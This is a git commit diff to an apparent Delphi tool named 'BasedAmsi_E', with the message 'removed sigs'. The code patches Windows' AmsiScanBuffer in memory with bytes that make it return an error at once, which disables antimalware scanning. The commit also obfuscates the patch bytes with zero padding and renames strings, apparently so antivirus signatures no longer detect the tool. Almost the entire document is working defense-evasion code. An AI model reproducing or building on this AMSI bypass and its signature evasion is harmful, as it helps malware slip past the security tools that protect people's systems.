34343e1daa5aaca4422ca065ccfcc5cddc6cde15
p4yl0ad <p4yl0ad@protonmail.com>
2021-07-26 16:53:35 +0100

    removed sigs

--- Experiments/BasedAmsi_E/BasedAmsi_E.dpr
+++ Experiments/BasedAmsi_E/BasedAmsi_E.dpr
@@ -29,9 +29,9 @@ var
   asb : Pointer;
   NumWrote : SIZE_T;
   //OldProtect : DWord;
-  OldProtect : DWord;
-  //PATCH : Byte = $C3;
-  PATCH : array[0..5] of Byte = ($B8, $57, $00, $07, $80, $C3);
+  OldProtect : DWord;               //1       //3       //5       //7       //9       //11
+  PH : array[0..11] of Byte = ($00, $B8, $00, $57, $00, $00, $00, $07, $00, $80, $00, $C3);
+  //1,3,5,7,9
   BA: TByteArr;
 
 
@@ -69,35 +69,34 @@ begin
     lib := LoadLibrary('amsi.dll');
     asb := GetProcAddress(lib,'AmsiScanBuffer');
     WriteLn(Format('[+] amsi.dll base address: %p',[asb]));
-    //amsi.dll base address at   0000-7FF9-E16E-35E0
-    //ScanStringBuffer Loaded at 0000-0000-0000-25e0 inside RX region of 2nd image
+    // dll base address at  0000-7FF9-E16E-35E0
+    // SSB Loaded at        0000-0000-0000-25e0
+    // inside RX region of 2nd image
 
 
-  //Change memory protection to RWX
+  //Change mem prot to R&W&X
     WriteLn('[+] Attempting to change protections');
-    ////VirtualProtect(asb, UIntPtr(SizeOf(garbage)), 64, 0);
     VirtualProtect(asb, 1, 64, OldProtect);
     WriteLn('[+] RWX protected');
 
   //Write to memory @ pter
+    //1       //3       //5       //7       //9       //11
     SetLength(BA,5);
-    BA[0] := PATCH[0];
-    BA[1] := PATCH[1];
-    BA[2] := PATCH[2];
-    BA[3] := PATCH[3];
-    BA[4] := PATCH[4];
+    BA[0] := PH[1];
+    BA[1] := PH[3];
+    BA[2] := PH[5];
+    BA[3] := PH[7];
+    BA[4] := PH[9];
+    BA[5] := PH[11];
 
-    WriteLn('[+] Patching with PATCH ', ByteArrayToHexString(BA,' '), ' of length ', SizeOf(PATCH));
-    Move(PATCH, asb^, SizeOf(BA));
-
-
-    //WriteProcessMemory(PidHandle, asb, @garbage, SizeOf(garbage), Written);
+    WriteLn('[+] Pat with PH ', ByteArrayToHexString(BA,' '), ' of length ', SizeOf(PH));
+    Move(PH, asb^, SizeOf(BA));
     WriteLn('[+] Written RET To the start of ScanStringBuffer');
 
   //Change memory protection to RX
     VirtualProtect(asb, 1, OldProtect, OldProtect);
     //VirtualProtect(asb, 1, 4, 0);
-    WriteLn('[+] RX protected');
+    WriteLn('[+] RX prot applied');
 
 
   except
